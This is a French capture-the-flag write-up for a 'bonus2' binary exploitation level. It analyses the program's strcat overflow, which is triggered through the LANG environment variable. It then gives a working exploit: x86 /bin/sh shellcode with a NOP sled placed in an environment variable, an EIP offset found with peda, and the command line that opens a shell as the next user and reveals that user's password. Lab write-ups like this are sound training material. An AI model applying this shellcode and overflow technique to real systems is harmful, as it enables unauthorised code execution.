## Démarches

- Après avoir désassemblé le programme avec gdb, on peut analyser son fonctionnement :
    
    - gdb -> `info functions` :

        ```
        [...]
        0x08048360  memcmp
        0x08048360  memcmp@plt
        0x08048370  strcat
        0x08048370  strcat@plt
        0x08048380  getenv
        0x08048380  getenv@plt
        0x08048390  puts
        0x08048390  puts@plt
        [...]
        0x080483c0  strncpy
        0x080483c0  strncpy@plt
        [...]
        0x08048484  greetuser
        0x08048529  main
        [...]
        ```

    - Le programme prend 2 arguments et concatène le premier avec une chaine définie en fonction du langage set dans l'environnement :
            
        - `./bonus2 Jacques test`
            > Hello Jacques
            
        - Si le premier argument fait au moins 40 caractères, la seconde chaine est concaténée aussi :
        
            `./bonus2 $(python -c 'print("A"*40)') ok`
            > Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAok

        - Si la longueur des 3 chaines additionnées fait plus de 72 caractères, le strcat segfault.
        
- On peut exploiter l'overflow du strcat :
    - On change la langue avec `export LANG=fi` :
        
        `./bonus2 Jacques test`
        > Hyvää päivää Jacques

    - On stocke un shellcode dans l'env *(cf bonus0)* :
        ```
        export SHELLCODE=`python -c 'print("\x90"*500+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")'`
        ```

    - Dans gdb, on récupère l'adresse du shellcode avec la commande `x/s *((char **)environ)` :

        > 0xbffff7a0

    - Avec la fonction pattern de peda (dans gdb), on cherche l'offset de l'eip 
        - `pattern create 40`
            > 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
        - `r $(python -c "print('A'*40)") 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'`
            > Stopped reason: SIGSEGV
        - `pattern search` 
            > EIP+0 found at offset: 18
            EIP commence au 18ème caractère de av[2], on devra donc ajouter 18 caractères de padding avant d'appeler le shellcode

- Hors gdb, on peut donc appeler le shellcode de l'env et ouvrir un shell avec la commande suivante :
    ```
    ./bonus2 $(python -c 'print("A"*40)')  $(python -c 'print("B"*18+"\xa0\xf7\xff\xbf")')
    Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB����
    $ whoami
    bonus3
    $ pwd
    /home/user/bonus2
    $ cat /home/user/bonus3/.pass
    71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
    $ exit
    ```
<!-- 
- `objdump -d bonus2`
    ```
    08048484 <greetuser>:
        8048484:	55                   	push   %ebp
        8048485:	89 e5                	mov    %esp,%ebp
        8048487:	83 ec 58             	sub    $0x58,%esp
        804848a:	a1 88 99 04 08       	mov    0x8049988,%eax
        804848f:	83 f8 01             	cmp    $0x1,%eax
        8048492:	74 26                	je     80484ba <greetuser+0x36>
        8048494:	83 f8 02             	cmp    $0x2,%eax
        8048497:	74 50                	je     80484e9 <greetuser+0x65>
        8048499:	85 c0                	test   %eax,%eax
        804849b:	75 6d                	jne    804850a <greetuser+0x86>
        804849d:	ba 10 87 04 08       	mov    $0x8048710,%edx
        80484a2:	8d 45 b8             	lea    -0x48(%ebp),%eax
        80484a5:	8b 0a                	mov    (%edx),%ecx
        80484a7:	89 08                	mov    %ecx,(%eax)
        80484a9:	0f b7 4a 04          	movzwl 0x4(%edx),%ecx
        80484ad:	66 89 48 04          	mov    %cx,0x4(%eax)
        80484b1:	0f b6 52 06          	movzbl 0x6(%edx),%edx
        80484b5:	88 50 06             	mov    %dl,0x6(%eax)
        80484b8:	eb 50                	jmp    804850a <greetuser+0x86>
        80484ba:	ba 17 87 04 08       	mov    $0x8048717,%edx
        80484bf:	8d 45 b8             	lea    -0x48(%ebp),%eax
        80484c2:	8b 0a                	mov    (%edx),%ecx
        80484c4:	89 08                	mov    %ecx,(%eax)
        80484c6:	8b 4a 04             	mov    0x4(%edx),%ecx
        80484c9:	89 48 04             	mov    %ecx,0x4(%eax)
        80484cc:	8b 4a 08             	mov    0x8(%edx),%ecx
        80484cf:	89 48 08             	mov    %ecx,0x8(%eax)
        80484d2:	8b 4a 0c             	mov    0xc(%edx),%ecx
        80484d5:	89 48 0c             	mov    %ecx,0xc(%eax)
        80484d8:	0f b7 4a 10          	movzwl 0x10(%edx),%ecx
        80484dc:	66 89 48 10          	mov    %cx,0x10(%eax)
        80484e0:	0f b6 52 12          	movzbl 0x12(%edx),%edx
        80484e4:	88 50 12             	mov    %dl,0x12(%eax)
        80484e7:	eb 21                	jmp    804850a <greetuser+0x86>
        80484e9:	ba 2a 87 04 08       	mov    $0x804872a,%edx
        80484ee:	8d 45 b8             	lea    -0x48(%ebp),%eax
        80484f1:	8b 0a                	mov    (%edx),%ecx
        80484f3:	89 08                	mov    %ecx,(%eax)
        80484f5:	8b 4a 04             	mov    0x4(%edx),%ecx
        80484f8:	89 48 04             	mov    %ecx,0x4(%eax)
        80484fb:	8b 4a 08             	mov    0x8(%edx),%ecx
        80484fe:	89 48 08             	mov    %ecx,0x8(%eax)
        8048501:	0f b7 52 0c          	movzwl 0xc(%edx),%edx
        8048505:	66 89 50 0c          	mov    %dx,0xc(%eax)
        8048509:	90                   	nop
        804850a:	8d 45 08             	lea    0x8(%ebp),%eax
        804850d:	89 44 24 04          	mov    %eax,0x4(%esp)
        8048511:	8d 45 b8             	lea    -0x48(%ebp),%eax
        8048514:	89 04 24             	mov    %eax,(%esp)
        8048517:	e8 54 fe ff ff       	call   8048370 <strcat@plt>
        804851c:	8d 45 b8             	lea    -0x48(%ebp),%eax
        804851f:	89 04 24             	mov    %eax,(%esp)
        8048522:	e8 69 fe ff ff       	call   8048390 <puts@plt>
        8048527:	c9                   	leave
        8048528:	c3                   	ret

    08048529 <main>:
        8048529:	55                   	push   %ebp
        804852a:	89 e5                	mov    %esp,%ebp
        804852c:	57                   	push   %edi
        804852d:	56                   	push   %esi
        804852e:	53                   	push   %ebx
        804852f:	83 e4 f0             	and    $0xfffffff0,%esp
        8048532:	81 ec a0 00 00 00    	sub    $0xa0,%esp
        8048538:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
        804853c:	74 0a                	je     8048548 <main+0x1f>
        804853e:	b8 01 00 00 00       	mov    $0x1,%eax
        8048543:	e9 e8 00 00 00       	jmp    8048630 <main+0x107>
        8048548:	8d 5c 24 50          	lea    0x50(%esp),%ebx
        804854c:	b8 00 00 00 00       	mov    $0x0,%eax
        8048551:	ba 13 00 00 00       	mov    $0x13,%edx
        8048556:	89 df                	mov    %ebx,%edi
        8048558:	89 d1                	mov    %edx,%ecx
        804855a:	f3 ab                	rep stos %eax,%es:(%edi)
        804855c:	8b 45 0c             	mov    0xc(%ebp),%eax
        804855f:	83 c0 04             	add    $0x4,%eax
        8048562:	8b 00                	mov    (%eax),%eax
        8048564:	c7 44 24 08 28 00 00 	movl   $0x28,0x8(%esp)
        804856b:	00
        804856c:	89 44 24 04          	mov    %eax,0x4(%esp)
        8048570:	8d 44 24 50          	lea    0x50(%esp),%eax
        8048574:	89 04 24             	mov    %eax,(%esp)
        8048577:	e8 44 fe ff ff       	call   80483c0 <strncpy@plt>
        804857c:	8b 45 0c             	mov    0xc(%ebp),%eax
        804857f:	83 c0 08             	add    $0x8,%eax
        8048582:	8b 00                	mov    (%eax),%eax
        8048584:	c7 44 24 08 20 00 00 	movl   $0x20,0x8(%esp)
        804858b:	00
        804858c:	89 44 24 04          	mov    %eax,0x4(%esp)
        8048590:	8d 44 24 50          	lea    0x50(%esp),%eax
        8048594:	83 c0 28             	add    $0x28,%eax
        8048597:	89 04 24             	mov    %eax,(%esp)
        804859a:	e8 21 fe ff ff       	call   80483c0 <strncpy@plt>
        804859f:	c7 04 24 38 87 04 08 	movl   $0x8048738,(%esp)
        80485a6:	e8 d5 fd ff ff       	call   8048380 <getenv@plt>
        80485ab:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%esp)
        80485b2:	83 bc 24 9c 00 00 00 	cmpl   $0x0,0x9c(%esp)
        80485b9:	00
        80485ba:	74 5c                	je     8048618 <main+0xef>
        80485bc:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
        80485c3:	00
        80485c4:	c7 44 24 04 3d 87 04 	movl   $0x804873d,0x4(%esp)
        80485cb:	08
        80485cc:	8b 84 24 9c 00 00 00 	mov    0x9c(%esp),%eax
        80485d3:	89 04 24             	mov    %eax,(%esp)
        80485d6:	e8 85 fd ff ff       	call   8048360 <memcmp@plt>
        80485db:	85 c0                	test   %eax,%eax
        80485dd:	75 0c                	jne    80485eb <main+0xc2>
        80485df:	c7 05 88 99 04 08 01 	movl   $0x1,0x8049988
        80485e6:	00 00 00
        80485e9:	eb 2d                	jmp    8048618 <main+0xef>
        80485eb:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
        80485f2:	00
        80485f3:	c7 44 24 04 40 87 04 	movl   $0x8048740,0x4(%esp)
        80485fa:	08
        80485fb:	8b 84 24 9c 00 00 00 	mov    0x9c(%esp),%eax
        8048602:	89 04 24             	mov    %eax,(%esp)
        8048605:	e8 56 fd ff ff       	call   8048360 <memcmp@plt>
        804860a:	85 c0                	test   %eax,%eax
        804860c:	75 0a                	jne    8048618 <main+0xef>
        804860e:	c7 05 88 99 04 08 02 	movl   $0x2,0x8049988
        8048615:	00 00 00
        8048618:	89 e2                	mov    %esp,%edx
        804861a:	8d 5c 24 50          	lea    0x50(%esp),%ebx
        804861e:	b8 13 00 00 00       	mov    $0x13,%eax
        8048623:	89 d7                	mov    %edx,%edi
        8048625:	89 de                	mov    %ebx,%esi
        8048627:	89 c1                	mov    %eax,%ecx
        8048629:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
        804862b:	e8 54 fe ff ff       	call   8048484 <greetuser>
        8048630:	8d 65 f4             	lea    -0xc(%ebp),%esp
        8048633:	5b                   	pop    %ebx
        8048634:	5e                   	pop    %esi
        8048635:	5f                   	pop    %edi
        8048636:	5d                   	pop    %ebp
        8048637:	c3                   	ret
    ```
     -->
<br>
----
## Ressources